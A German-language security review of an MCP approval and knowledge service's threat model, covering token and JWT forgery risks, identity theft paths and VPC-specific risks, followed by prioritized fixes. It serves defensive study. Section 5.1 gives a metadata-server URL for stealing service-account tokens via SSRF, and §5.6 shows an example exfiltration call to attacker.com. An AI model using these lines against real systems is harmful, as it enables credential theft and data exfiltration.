# Security-Review — Scope-Gap in SECRET.md

> Reviewer: AppSec / Red-Team-Lead-Perspektive, 15 Jahre Multi-Tenant-SaaS + Cloud-Security
> Datum: 2026-05-17
> Scope: mcp-approval2 + mcp-knowledge2, Pilot-Mode (5-15 User)
> Anlass: SECRET.md modelliert nur "wer liest Passwörter" — der User fragt nach Daten-System-Zugriff, Identity-Theft und VPC-Realität.

---

## 1. Executive Summary

SECRET.md ist ein solides Modell für **Secret-Storage at rest** — KMS-Envelope, RLS, AAD-Binding, Audit. Es ignoriert aber den gesamten Lifecycle **nachdem der Server entschlüsselt hat** und den größten realen Angriffsvektor: **gestohlene Tokens / Sessions / OBO-JWTs in transit oder runtime**. Ein Angreifer mit 5 Minuten Zugriff auf den laufenden Worker (compromised dependency, RCE, side-channel, kompromittierter Operator-Account, Insider mit kubectl-Recht im VPC) liest **alle User-Daten in KC2 / Drive / Calendar / GitHub / GCP** ohne je `kms.Decrypt` aufzurufen — er nutzt einfach die Worker-Identität, die `MCP_KNOWLEDGE_SERVICE_TOKEN` und die in Memory aufgewärmten OAuth-Refresh-Tokens. Der Audit-Log fängt das nicht — er sieht legitime Service-Calls.

Der zweite kritische Gap: **`MCP_KNOWLEDGE_SERVICE_TOKEN` ist ein god-mode-Token gegenüber KC2**. Wer den hat (Doppler-Leak vom 2026-05-16 zeigt: das ist nicht hypothetisch), kann mit beliebigem `X-On-Behalf-Of` jeden User in KC2 lesen/schreiben/erasen — RLS in KC2 vertraut dem Header.

Für 5-15 Pilot-User mit Operator-Trust-Modell ist das **akzeptabel mit Audit-Trail**, aber das gehört in SECRET.md klar gesagt, mit klaren Re-Visit-Triggern (>15 User, DSGVO-Auditor, oder erste echte Tester die nicht Axel sind). In einem Unternehmens-VPC verschiebt sich das Risikoprofil deutlich — siehe §5.

---

## 2. Out-of-Scope des aktuellen SECRET.md

Aktuell **nicht** modelliert (sollte rein):

| Klasse | Was wird übersehen |
|---|---|
| **Token-/Session-Theft in Transit/Memory** | Cookie-Theft, Bearer-in-RAM, OBO-JWT-Replay, Refresh-Token-Replay |
| **OBO-JWT-Forgery** | RS256-Private-Key (`JWT_RS256_PRIVATE_KEY_PEM`) als single point of compromise für ganz KC2 |
| **SERVICE_TOKEN als god-mode** | `MCP_KNOWLEDGE_SERVICE_TOKEN` umgeht KC2-RLS effektiv (KC2 trusts `X-On-Behalf-Of` header) |
| **JWT_SECRET (HS256)** | Symmetric secret für alle Access-Tokens an Claude.ai-MCP-Clients — Leak = unbegrenzte Account-Takeover |
| **Compromised Worker / Supply-Chain** | Malicious npm-dep → Process-Memory enthält **alle entschlüsselten User-Tokens** der letzten Minuten |
| **WebAuthn-Bypass-Pfade** | Recovery-Codes (`routes/auth/recovery.ts`), Passkey-Enrollment-Stealing über übernommene Session |
| **Approval-Replay** | Selbe Approval mehrfach durch verschiedene Request-IDs? Race-Conditions zwischen pending_approvals und sub-MCP-Forwarder |
| **Insider mit DB-Read im VPC** | Postgres-Verbindung von Nachbar-Workload, KMS-Decrypter-IAM für Service-Account "geliehen" |
| **Metadata-Server-Theft** | Cloud Run / GCE / GKE: `169.254.169.254` → Workload-Identity-Token → kms.Decrypt without app authentication |
| **DNS-/Egress-Manipulation** | KC2-Hostname intern auflösbar gemacht auf eigenen Proxy → Man-in-the-Middle für OBO-JWT |
| **Audit-Log Tampering** | `audit_log` ist nur "append-only-by-convention", kein DB-Constraint, kein WORM-Sink, kein Hash-Chaining |
| **Multi-Origin Cookie Leak** | `COOKIE_DOMAIN=.ai-toolhub.org` → jede neue subdomain bekommt Cookie. Cross-Site-Scripting auf jeder subdomain = Total-Session-Hijack |
| **DCR Open-Registration** | SEC-005 wurde gefixt, aber bleibt strukturell gefährlich: jeder neue OAuth-Client ist ein neuer Trust-Anchor |
| **Cookie-Theft via Service-Worker** | SEC-034 (open-redirect) ist MEDIUM-offen — SW kann unter bestimmten Bedingungen Push-Payloads weitergeben |

---

## 3. Threat-Vektoren — Daten-System-Zugriff

### 3.1 CRITICAL — `MCP_KNOWLEDGE_SERVICE_TOKEN` Leak → kompletter KC2-Read/Write/Erase aller User

- **Beschreibung:** Approval2 sendet `Authorization: Bearer <SERVICE_TOKEN>` + `X-On-Behalf-Of: <OBO-JWT>` an KC2. KC2 trusts den OBO-Header **wenn der Service-Token gültig ist**. Wer den Service-Token hat, baut OBO-JWTs mit beliebigem `sub`/`on_behalf_of` (entweder selbst signiert wenn JWT_RS256_PRIVATE_KEY auch geleaked ist — oder einfacher: KC2 wird im legacy-Pfad evtl. nur den service-token akzeptieren ohne OBO-Verify). Code: `packages/adapters/src/knowledge/http-client.ts:243` — der Service-Token geht **in jedem Call mit**.
- **Angreifer-Profil:** Operator-Account-Takeover, Doppler-Leak (passiert am 2026-05-16!), CI-Secret-Exfil über kompromittierten GH-Workflow, kompromittierter npm-Dep im Build-Container.
- **Voraussetzungen:** Lesen einer einzigen Env-Var. Keine Audit-Spur in approval2 (es ist nicht-decryption).
- **Was wird gestohlen:** Alle Objects, Memos, Skills, Apps, geteilte Shares aller User auf KC2. Search über alles. **Erase aller User** (mit/ohne `x-erase-receipt` — KC2-Migrations-Window erlaubt fallback ohne Receipt).
- **Mitigation heute:** Scope-Split-Tokens (`SERVICE_TOKEN_ERASE/SYNC/OPS`) — gut, aber `MCP_KNOWLEDGE_SERVICE_TOKEN` (legacy master) ist als Fallback weiterhin akzeptiert solange KC2 nicht hart umstellt (sieht aus CLAUDE.md: pending).
- **Gap:** Token-Lifetime nicht limitiert (statisch in Doppler). Keine Rate-Limit pro Token. Kein Source-IP-Binding. Kein KC2-side Anomaly-Detection ("warum 500 reads in 10s über alle User?"). Doppler-Leak vom 16.5. zeigt: das ist real, nicht hypothetisch.

### 3.2 HIGH — JWT_RS256_PRIVATE_KEY_PEM Compromise → universal OBO-Forgery

- **Beschreibung:** Der RS256-Private-Key in `apps/server/src/auth/jwt-signing.ts` signiert alle OBO-JWTs an KC2. Wer den Key hat, kann beliebige OBO erzeugen ohne approval2's Auth-Logik zu durchlaufen.
- **Voraussetzungen:** Process-Memory-Read (RCE im Worker), Doppler-Leak, Container-Image-Exfil, kompromittierter Cloud-Build-Step.
- **Was wird gestohlen:** Identisch zu §3.1 — alle KC2-User-Daten unter beliebiger Identität.
- **Mitigation heute:** Key ist `extractable=false` im WebCrypto (gut gegen JS-Heap-Dump, schwach gegen Process-Memory-Dump). Keine Rotation (`JWT_KID` defaults `'default'`, kein Rotation-Job).
- **Gap:** Keine Key-Rotation-Automation. Kein HSM (Stufe 4 SECRET.md, aber das ist auf KMS-DEK-Master bezogen, nicht JWT-Signing-Key — der ist **deutlich kritischer** weil pro-Request-Use vs. pro-Decrypt-Use).

### 3.3 HIGH — Per-User Google Refresh-Token Theft (Workspace Daten-Exfil)

- **Beschreibung:** Refresh-Tokens für GWS-Sub-MCP sind in `user_sub_mcp_config` KMS-wrapped gespeichert. Bei Tool-Call wird der Token **im Worker-Memory entschlüsselt**, gegen Google getauscht, der Access-Token geht zum sub-MCP-Worker (eigene `*.workers.dev` Cloudflare-Worker), der dann gegen Google-API spricht.
- **Angreifer-Profil:** (a) Compromised Worker bei approval2 (RAM-Sniff), (b) compromised sub-MCP-Worker (sieht plaintext Access-Tokens im in-flight Memory), (c) Operator mit DB+KMS-Access (in SECRET.md erfasst).
- **Was wird gestohlen:** Read/Write auf Gmail, Drive, Calendar, Sheets, Docs, Contacts pro User — **abhängig von User-erteilten Scopes**. Mit GWS-Refresh-Token kann Angreifer Tage später Phishing-Mails aus echten User-Accounts senden, Drive-Files exfilieren, Calendar manipulieren.
- **Mitigation heute:** KMS-Wrap (gut bei DB-Leak), AAD-Binding, RLS. Kein Touch-Verify pro Refresh-Use.
- **Gap:** Refresh-Tokens sind in approval2-Memory NACH dem Decrypt **vollständig sichtbar**. Eine Stufe-3-Hardening (PRF-Wrap mit Passkey-Touch) würde das fixen — ist als Roadmap-Item drin, aber nicht umgesetzt. Sub-MCP-Worker auf Cloudflare ist eine **zweite Trust-Boundary** die SECRET.md gar nicht modelliert.

### 3.4 HIGH — Service-Account-JSON für gcloud (Per-User-stored)

- **Beschreibung:** Per-User `_service_account_json` in `user_sub_mcp_config` (~1.6 KB JSON mit RSA-Private-Key). Das ist effektiv ein **Long-Lived GCP-Credential** ohne Refresh-Mechanik — Diebstahl bedeutet permanenten GCP-Zugriff bis User es manuell revoked.
- **Voraussetzungen:** Wie §3.3.
- **Was wird gestohlen:** Alles im GCP-Projekt das die SA darf — typisch wenn User "GCP für mcp-gcloud" einrichtet sind das ganze Cloud-SQL, BigQuery, GCS-Buckets. Schadenspotenzial steigt mit der SA-Permission.
- **Gap:** SA-JSON sollte ideell durch Workload-Identity-Federation ersetzt werden (Stufe-5-Hardening). Solange das nicht da ist: SA-JSON gehört in die kritischste Kategorie.

### 3.5 MEDIUM — GitHub-OAuth/PAT-Token-Theft

- **Beschreibung:** GitHub-MCP nutzt pre-registered OAuth (in V1 Setup). In V2/AS-3 wahrscheinlich analog. Token in `user_sub_mcp_config` oder gateway-side. Diebstahl = GitHub-Repos (Read aller Repos die User Zugriff hat, ggf. Write).
- **Schweregrad:** Hängt am GitHub-Scope (`repo`-Scope vs. `read:user`). Industrial-Espionage-Tier wenn User Source-Code-Zugriff hat.

### 3.6 MEDIUM — Share-Grants-Logic in KC2 (Cross-User-Read)

- **Beschreibung:** Bereits CRITICAL-Finding `SEC-K-NEW` im Schwester-Repo (RLS-Bypass via share_grants), gefixt am 2026-05-17. Aber: Share-Logic ist neu, Test-Coverage 28 Tests (von 5 auf 28 erhöht). Bei Multi-User-Pilot mit echten Testern werden Share-Pfade häufiger getestet → Wahrscheinlichkeit für Folge-Bugs nicht 0.
- **Gap:** SECRET.md erwähnt Share-Boundary nicht. Sollte als eigene Trust-Boundary modelliert sein.

---

## 4. Threat-Vektoren — Identity-Theft

### 4.1 CRITICAL — `JWT_SECRET` (HS256) Leak → unbegrenzte MCP-Bearer-Forgery

- **Beschreibung:** Access-Tokens für Claude.ai-MCP-Clients sind HS256-signed mit `JWT_SECRET` (token.ts:233). Symmetric → wer den Secret hat, signiert **beliebige Tokens für beliebige User** mit beliebigem Scope.
- **Pfad:** Doppler-Var. Bei Leak (16.5.) → Total-Compromise aller Claude.ai-MCP-Sessions bis Rotation. Tokens haben 30 min TTL, aber Refresh-Token-Family-Replay-Detect basiert auf DB-Lookup — Angreifer mit Secret signt einfach immer neue Access-Tokens ohne Refresh-Flow.
- **Gap:** HS256 statt RS256 für Access-Tokens. Asymmetric wäre besser (Public-Key kann zu Validierern verteilt werden, Private-Key bleibt server-only — und wenn Resource-Server kompromittiert wird, kann er Tokens nicht forgen).
- **Empfehlung:** HS256→RS256-Migration für Access-Tokens. Akzeptiere `JWT_SECRET`-Leak als Operationsrisiko.

### 4.2 HIGH — Session-Cookie-Theft via XSS auf irgendeiner `.ai-toolhub.org`-Subdomain

- **Beschreibung:** `COOKIE_DOMAIN=.ai-toolhub.org`. Jede zukünftige Subdomain (test, staging, blog, marketing, dev) die XSS hat, kann das Session-Cookie lesen wenn nicht HttpOnly. **Aber:** `authCookieOpts` setzt `httpOnly: true` — gut. **Trotzdem:** Cookie-Bound state cookies oder andere non-HttpOnly Cookies können auf andere Subdomains leaken. Plus: jede kompromittierte Subdomain kann **neuen JWS schreiben** in das Cookie-Namespace und damit Auth-Flows manipulieren (forged `oauth_state`).
- **Voraussetzungen:** XSS auf irgendeiner `*.ai-toolhub.org`. Bei Multi-User-Pilot wahrscheinlich, weil andere Services auf der Domain laufen.
- **Mitigation:** Cookie-Prefix `__Host-` (kein Domain-Attribut erlaubt) wäre cleaner — bricht aber Multi-Origin-Flow zwischen app2 und mcp2.
- **Gap:** SEC-022 (CSRF-Middleware) + SEC-023 (CSP / X-Frame / Referrer-Policy) sind **noch offen** (MEDIUM). Ohne CSP ist XSS-Schaden multiplikativ.

### 4.3 HIGH — DCR-OAuth-Client-Hijack (post SEC-005-Fix)

- **Beschreibung:** SEC-005 (1-Klick-Account-Takeover via offene DCR) ist gefixt — `DCR_OPEN=false` + `DCR_INITIAL_ACCESS_TOKEN`-Gate. Aber: Pilot-Operator muss `DCR_INITIAL_ACCESS_TOKEN` ausgeben — wer den Token hat, kann beliebig viele Clients registrieren mit beliebigen `redirect_uri`. Kombiniert mit Phishing → User klickt auf Login bei angeblichem MCP-Client, Token geht zum Angreifer.
- **Gap:** Keine `redirect_uri`-Allowlist auf Domain-Ebene (Wildcard *.attacker.com möglich wenn keine Validation gibt).
- **Empfehlung:** `redirect_uri`-Domain-Whitelist als Operator-Policy.

### 4.4 HIGH — WebAuthn-Bypass via Account-Recovery-Pfad

- **Beschreibung:** `apps/server/src/routes/auth/recovery.ts` existiert. Wenn Recovery z.B. Email-Link-basiert ist (Standard), ist die Email das Single-Factor-Backup. Email-Compromise (Phishing, IMAP-Theft, Reset-via-Provider) → Recovery-Code → neuer Passkey enrolled → Total-Account-Takeover, ohne dass UV oder existing Passkey gefragt wird.
- **Gap:** SECRET.md verlässt sich implizit auf Passkey-Strength, ignoriert die schwächste Recovery-Schiene. Im VPC-Kontext (User-Email läuft auch im VPC, IT-Team kann auf Mailbox zugreifen) — Insider-Threat ist stark.
- **Empfehlung:** Recovery erfordert minimum 2 Faktoren (Email + admin-Approval), oder Recovery-Code beim Onboarding offline ausgegeben + UV beim Use.

### 4.5 HIGH — Approval-Bypass via `write_mode` (Plaintext-Token in Memory)

- **Beschreibung:** Write-Mode (15/60/240 min) ist nach Passkey-Touch aktiv. Während der Zeit werden `sensitivity=write`-Tools **ohne Approval** ausgeführt. Ein Angreifer mit aktiver Session in diesem Fenster (z.B. compromised Browser-Tab via Subdomain-XSS, oder Tab-Hijacking via WebSocket) kann alle write-Tools triggern.
- **Voraussetzungen:** Hijacked Session ODER kompromittierter Browser ODER physischer Zugriff auf entsperrten Bildschirm.
- **Gap:** Kein per-call UV (User-Verification) für write-Tools im Write-Mode-Fenster (das ist by-design). Aber: Kein per-tool-cap (z.B. "max 10 write-calls pro Write-Mode-Session"), kein Anomaly-Detect.

### 4.6 MEDIUM — JWKS-Key-Rotation fehlt

- **Beschreibung:** `JWT_KID` defaults `'default'`. Kein Rotation-Mechanismus dokumentiert. Bei Key-Compromise muss manuell rotiert werden — Window of compromise potentiell unlimited.

### 4.7 LOW — Refresh-Token-Replay (gut gehandhabt)

- Family-Detect + Replay-Revoke (token.ts:492-506) ist sauber implementiert. Kleines Restrisiko: zwischen Issue + Lookup eines neuen Tokens kann ein paralleler Replay durchschlüpfen — atomare DB-Sequenz mit `FOR UPDATE` wäre stärker.

### 4.8 MEDIUM — Audit-Log ist fail-soft + nicht append-only-enforced (SEC-025)

- **Beschreibung:** `emitAudit` fängt jeden Error stumm ab (audit.ts:71-74). DB-Down → keine Audit-Spur. **Kein DB-Trigger der UPDATE/DELETE auf audit_log blockt** — Operator mit DB-Access kann Spuren löschen. SECRET.md's "Audit-Log macht jeden Decrypt nachweisbar" ist eine **Annahme**, kein Enforcement.
- **Gap:** Trigger `BEFORE UPDATE OR DELETE ON audit_log RAISE EXCEPTION` fehlt. Kein WORM-Sink (Pub/Sub → BigQuery archive → Object-Lock-Bucket).

---

## 5. VPC-spezifische Risiken (das beantwortet die User-Frage direkt)

> User-Annahme: "Im Unternehmen im VPC." Das **verschiebt** das Threat-Modell deutlich gegenüber dem "Solo-Operator auf Fly.io"-Modell von SECRET.md.

### 5.1 CRITICAL — Metadata-Server-Theft auf GCE/GKE/Cloud Run

- **Cloud Run / GCE:** `169.254.169.254` liefert Service-Account-Tokens **ohne weitere Auth** an jeden Prozess im Container. SSRF-Bug in approval2 → Angreifer fetcht `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token?audience=...` → bekommt einen Token mit voller Service-Account-Permission. Das beinhaltet KMS-Decrypt-Permission.
- **GKE:** Mit Workload-Identity besser, aber ohne Federation default ist es das gleiche Problem.
- **Mitigation:** SSRF-Filter im Worker (Block private IPs in user-supplied URLs), GKE-Workload-Identity-only, Metadata-Concealment (Pods ohne Metadata-Zugriff).
- **Gap in approval2:** Keine SSRF-Hardening sichtbar. Tool-Calls können URLs enthalten (z.B. `bookmarks.create`). Sub-MCP-Forwarder, kc_wrappers, etc. — alle fetch'en zu externen URLs. Wenn auch nur einer dieser Pfade einen "user-supplied URL"-Schritt hat → SSRF gegen Metadata-Server.

### 5.2 CRITICAL — Postgres direkt erreichbar aus Nachbar-Workloads

- **Pattern:** In Corporate-VPC ohne Network-Segmentation kann ein anderer Workload (z.B. Logging-Agent, anderer Service der gehackt wurde) **direkt zum Postgres-Host connecten**. Wenn er Credentials hat (via Secret-Manager-Read), bypassed er alles. **RLS hilft nur wenn die Connection als app-user verbindet** — Admin-Connections gehen mit BYPASSRLS.
- **Mitigation:** Postgres in Private-VPC nur erreichbar von approval2-SA. Cloud-SQL Auth-Proxy mit IAM-Auth. Postgres-User mit BYPASSRLS strikt getrennt.
- **Gap in approval2:** Migrations-User (siehe `migrate()` in postgres.ts) hat full DDL — wenn der Migration-User-Credential ge-leaked ist, kann Angreifer Schema verändern (z.B. RLS-Policy droppen) ohne dass es sofort auffällt.

### 5.3 HIGH — KMS-API-Zugriff über Service-Account-Impersonation

- **Pattern:** GCP-IAM erlaubt SA-Impersonation. Wer `roles/iam.serviceAccountTokenCreator` auf der approval2-SA hat, kann sich Token ausgeben lassen → KMS.Decrypt aufrufen → Audit-Log zeigt `principalEmail=<impersonator>@<project>` aber das ist im Corporate-Setup ggf. ein "ops-team@" Account den mehrere Personen nutzen. Attribution geht verloren.
- **Mitigation:** Impersonation-Audit-Alerts. `gcloud iam service-accounts get-iam-policy` regelmäßig prüfen. Org-Policy `iam.disableServiceAccountKeyCreation` aktivieren.
- **Gap in SECRET.md:** Audit-Trail nimmt an "principalEmail = V2 SA" — das ist nur eine von mehreren möglichen Identitäten.

### 5.4 HIGH — Lateral Movement von kompromittiertem Nachbar-Service

- **Pattern:** Anderer interner Service im selben VPC wird kompromittiert (typisch: alter Build-Container, legacy Tool, internes Monitoring-Plugin). Von dort: Network-Scan, Versuch zu approval2's internal API. **Wenn das interne `/internal/v1/*`-Endpoint ohne mTLS auskommt** (siehe Conventional Bearer-Auth via `INTERNAL_SERVICE_TOKEN` in app-factory.ts:964) — und der Service-Token in einem Shared-Secret-Manager liegt → Lateral-Move erfolgreich.
- **Mitigation:** mTLS zwischen approval2 und allen internen Callern. Network-Policy/Service-Mesh erzwingt das.
- **Gap:** mTLS-Pfad existiert nicht in approval2. Trust-Boundary "internal-network ist trusted" ist klassisch fahrlässig — Zero-Trust-Pattern wäre Pflicht im Enterprise-VPC.

### 5.5 HIGH — DNS-Hijacking innerhalb VPC

- **Pattern:** Interner DNS-Resolver liefert für `knowledge2.fly.dev` (oder `mcp2.ai-toolhub.org` wenn Split-Horizon) eine Internal-IP → MitM-Proxy → liest OBO-JWTs + SERVICE_TOKEN aus jeder Request.
- **Mitigation:** mTLS mit Certificate-Pinning (approval2 muss KC2-Cert pinnen). HSTS-Preload (gegen MitM via cert), aber das hilft nur gegen Public-Cert-Authorities, nicht gegen Corporate-CA in Trust-Store.
- **Gap:** Kein Cert-Pinning sichtbar in `HttpKnowledgeAdapter`. Standard-`fetch` trustet was im OS-Trust-Store ist — im Corporate-VPC ist die interne CA da → MitM trivial.

### 5.6 MEDIUM — Egress ohne Filter (Data-Exfil)

- **Pattern:** Compromised approval2-Worker ruft `fetch('https://attacker.com', { body: dump })` auf. Ohne Egress-Policy gibt's nichts was das blockt. Cloud-Audit-Logs für Egress sind selten aktiviert.
- **Mitigation:** Egress-Allowlist (`googleapis.com`, `knowledge2.fly.dev`, `api.openai.com`, ...). VPC-Service-Controls.

### 5.7 MEDIUM — Shared-Logging-System sieht User-Daten

- **Pattern:** Approval2 loggt z.B. via console.error in shared GCP-Cloud-Logging. Wenn Tool-Outputs (Drive-Files, Mails) in Logs landen → andere Teams im VPC sehen es. Aktuelle Logs zeigen `console.error('[audit] failed to emit', event.action, err)` — `err` kann bei DB-Constraint-Violation den ganzen Insert mit-Body enthalten.
- **Gap:** Kein structured-logging mit explicit redaction. Stack-Traces können PII leaken.

### 5.8 LOW — Egress: SSRF auch zu internen Services

- **Pattern:** Tool-Inputs die URLs enthalten → SSRF gegen interne Admin-Panels von Nachbar-Services (Jenkins, internal-Wiki). VPC-Zugriff macht das angreifbar.

---

## 6. Konkrete Empfehlungen — priorisiert

### MUSS — vor weiterer Pilot-Öffnung jenseits Operator+Axel

| # | Item | Aufwand | Wert | Trigger |
|---|---|---|---|---|
| M1 | **Audit-Log append-only-Enforcement** — DB-Trigger gegen UPDATE/DELETE; Mirror in Pub/Sub→BigQuery WORM. | 4h | Macht das eine bestehende Mitigation tatsächlich vertrauenswürdig. | Sofort. SECRET.md verlässt sich darauf. |
| M2 | **HS256→RS256 für MCP-Access-Tokens** — JWT_SECRET ist single point of total session forgery. | 1d | Macht den Secret-Leak vom 16.5. weniger schmerzhaft. | Sofort. |
| M3 | **KC2 SERVICE_TOKEN-Scope-Split fertig** (laut CLAUDE.md "pending operator action") + legacy master-Token in KC2 deaktivieren. | 1h | Reduziert god-mode-Surface. | Sofort. |
| M4 | **JWT_RS256-Key-Rotation-Pfad** — `JWT_KID` mit 2 aktiven keys (current + previous), Rotation alle 30 Tage automatisiert via TF. | 1d | Macht Memory-Dump weniger katastrophal. | Vor "echte Tester nicht Axel". |

### SOLLTE — vor >15 User oder DSGVO-Auditor

| # | Item | Aufwand | Wert | Trigger |
|---|---|---|---|---|
| S1 | **SSRF-Hardening** — Block private/link-local-IPs in allen user-influenced fetch-Pfaden. | 4h | Schließt Metadata-Server-Diebstahl. | Vor Cloud-Run-Migration zu business-Mode. |
| S2 | **Cert-Pinning für approval2→KC2** | 4h | Macht VPC-DNS-Hijacking ineffektiv. | Wenn jemals in Corporate-VPC deployed wird. |
| S3 | **CSP + X-Frame-Options + Referrer-Policy** (SEC-023, MEDIUM-offen) | 4h | Reduziert XSS-Schadenspotenzial. | Sofort. Trivial. |
| S4 | **CSRF-Middleware auf state-changing Routes** (SEC-022, MEDIUM-offen) | 1d | Defense-in-Depth gegen Multi-Origin-Cookie-Bug-Klasse. | Sofort. |
| S5 | **Recovery-Hardening** — Recovery erfordert minimum (Email + Operator-Approval) ODER offline-issued code mit UV. | 1d | Schließt schwächste Recovery-Schiene. | Vor >5 User. |
| S6 | **Stufe-3-Hardening (PRF-Wrap auf Sensitive-Configs)** — bereits in SECRET.md roadmap. | 6h | Killt "compromised worker reads OAuth refresh tokens" Vektor. | Wenn Gmail/Drive-Scopes geöffnet werden. |
| S7 | **KMS-Decrypt-Anomaly-Alerts (Stufe 1)** — bereits in SECRET.md roadmap. | 2h | Detection-Layer. Niedrige Hängende Frucht. | Sofort. |
| S8 | **mTLS für /internal/v1/* + /v1/internal/* in KC2** | 1d | Schließt VPC-Lateral-Movement-Vektor. | Wenn jemals VPC-Deployment. |

### KANN — Hardening für regulierten Multi-Tenant-Mode

| # | Item | Trigger |
|---|---|---|
| K1 | Per-User-KEK (Stufe 2 SECRET.md) | >15 User + DSGVO |
| K2 | Cloud HSM (Stufe 4) | Regulated industry |
| K3 | Zero-Knowledge / Client-Side-Encrypt (Stufe 5) | Public SaaS |
| K4 | Egress-Allowlist via VPC-SC | Business-Mode-Migration |
| K5 | Workload-Identity-Federation statt SA-JSON für `gcloud`-Pfad | Vor Multi-User-GCP-Pilot |

---

## 7. Was SECRET.md ergänzen sollte (konkrete Patch-Vorschläge)

### 7.1 Neue Section: "Trust-Boundary-Definition"

Aktuell implizit. Sollte explizit benennen:
- TB-1: External Attacker (über Public-Internet, ohne Auth) → blockiert von Auth+RLS+KMS.
- TB-2: Authenticated User → blockiert von RLS+AAD.
- TB-3: Compromised Sub-MCP-Worker → sieht plaintext-Tokens kurz (in SECRET.md erfasst).
- **NEU** TB-4: Compromised approval2-Worker (RCE/dep-attack) → sieht alle entschlüsselten Secrets der letzten Minuten in Process-Memory **und** kann JWT_RS256/JWT_SECRET/SERVICE_TOKEN exfilieren → universal compromise. **In SECRET.md fehlt komplett.**
- **NEU** TB-5: Compromised Operator-Identity (Doppler-Account, Google-Workspace-Admin) → liest alle Doppler-Secrets → universal compromise. **In SECRET.md nur halb adressiert ("operator trusted").**
- **NEU** TB-6: VPC-Insider (anderer Workload, Network-Sniffer, Internal-DNS) → siehe §5.
- **NEU** TB-7: Compromised KC2 → sieht alle OBO-JWT-Targets, alle Object-Bodies, alle Shares.

### 7.2 Neue Tabelle "Threats outside Secret-Storage"

Ergänze die bestehende Threat-Tabelle (§"Threat-Modell — was schützt was") um:

| Angriff | Schicht 1 (KMS) | RLS | AAD | Audit | Status |
|---|---|---|---|---|---|
| **JWT_SECRET-Leak (HS256 access tokens)** | — | — | — | (✅ wenn Token-Use über approval2 läuft) | **CRITICAL — Fix M2** |
| **JWT_RS256-Private-Key-Leak** | — | — | — | (✅ über KC2-Audit, indirekt) | **HIGH — Fix M4 (Rotation)** |
| **MCP_KNOWLEDGE_SERVICE_TOKEN-Leak** | — | — | — | (KC2-Audit) | **CRITICAL — Fix M3 (Scope-Split)** |
| **Compromised approval2-Worker (RCE/dep)** | ❌ Memory-Read aller Secrets | ❌ | ❌ | ❌ keine Decrypt-Spur in audit_log | **HIGH — Defense: Supply-Chain (Dependabot, SBOM, locked deps)** |
| **VPC-Metadata-Server-Theft (SSRF)** | ❌ wenn SA hat kms-decrypt | ❌ | ❌ | ✅ aber Source missattributed | **HIGH bei VPC-Deployment — Fix S1** |
| **Internal DNS/MitM** | — | — | — | — | **HIGH bei VPC — Fix S2** |
| **Operator-Console-Identity-Theft** | ❌ Decrypt via SA | ❌ | ❌ | ✅ aber operator-account-shared | **HIGH — Fix: Operator-MFA-Mandate, IAM-Audit** |

### 7.3 Neue Section: "Identity-Theft-Pfade"

- Cookie-Theft (multi-origin domain-Scope-Risk)
- Approval-Replay + Write-Mode-Bypass
- WebAuthn-Recovery-Schwächere-Schiene
- DCR-Client-Hijack (auch nach SEC-005-Fix)

### 7.4 Verschärfte Re-Visit-Trigger

Bestehend "Hardening Stufe 1 wird Pflicht wenn ... >15 echte User, DSGVO, User-Compromise-Incident, Business-Mode-Migration". Ergänzen:
- **Insider-Risk-Modell:** Sobald >1 Person Doppler-Read-Access hat (heute: Axel only), wird Audit-Log-WORM Pflicht (M1).
- **VPC-Deployment:** Sobald jemals in Corporate-VPC deployed: mTLS + Cert-Pinning + SSRF-Filter Pflicht.
- **GHA-CI-Secret-Exposure:** Letzter Doppler-Leak war operationaler Fehler. Sobald CI Secrets pulled, ist deren Half-Life kürzer als geplant. Rotation-Frequenz pro Lifecycle.

### 7.5 Klarere Risiko-Statements

Aktuell: "Operator (Axel) muss sich selbst vertrauen." Korrekter wäre:
> **Operator-Trust-Assumption (Pilot-Mode):** wir vertrauen
> (a) Axel persönlich,
> (b) Axels Geräte-Hygiene (Laptop, Phone),
> (c) Axels Doppler-Account-Sicherheit (MFA, FIDO2),
> (d) Axels GCP-Console-Account,
> (e) der npm-Supply-Chain (lockfile + Dependabot),
> (f) Fly.io-Operationskette (Build-Image-Layer, fly secrets).
> Compromise von einem dieser → effektiver Total-Compromise aller User-Daten.
> Audit-Trail erlaubt Post-Incident-Forensik, **schützt aber nichts präventiv**.

---

## 8. Abschließende Bewertung

| Aspekt | Pilot 5-15 User auf Fly.io | Pilot in Corporate-VPC | Production >50 User |
|---|---|---|---|
| Aktuelles SECRET.md-Modell ausreichend? | Ja, **mit** den 4 MUSS-Items (M1-M4) und expliziter Operator-Trust-Doku | **Nein** — VPC-spezifische Risks (§5) sind komplett un-modeliert | Nein, mehrere Stufen-Hardening Pflicht |
| Größte unbenannte Lücke | Process-Memory-Compromise + SERVICE_TOKEN-god-mode | Metadata-Server + Lateral-Move + DNS | Per-User-KEK + Zero-Knowledge |
| Realistische Threat-Acteur | Compromised npm-dep, Doppler-Account-Phish | Insider mit VPC-Network-Access | Nation-State, organisierte Krim |

**Bottom-Line:** SECRET.md ist gut für "what we do at rest". Es ist **unvollständig** für "what could go wrong end-to-end". Die User-Frage ("Daten-System-Zugriff, ID-Diebstahl, im VPC") trifft präzise die Lücken. Empfehlung: SECRET.md umbenennen in **`THREAT-MODEL.md`**, Sections 7.1-7.5 einarbeiten, M1-M4 als pre-pilot-blocker einplanen.

---

> **Hinweis:** Wegen 2500-Wort-Budget gekürzt:
> - Approval-Display-Template-IPI-Risiko (teilweise in SECURITY_ISSUES.md SEC-020 erfasst).
> - PWA-Service-Worker als Persistence-Vektor.
> - Detail-Walkthrough einer end-to-end-Exploit-Chain (Doppler-leak → JWT_SECRET → access-token-forge → cookie-replay → write-mode-active → erase-all-data).
> - Backup-/Restore-Vektoren (R2-Bucket-Permission, KMS-Decrypter auf alten Backups).
> - GDPR-Recht-Auf-Auskunft-Risk (Audit-Logs sind selbst PII!).
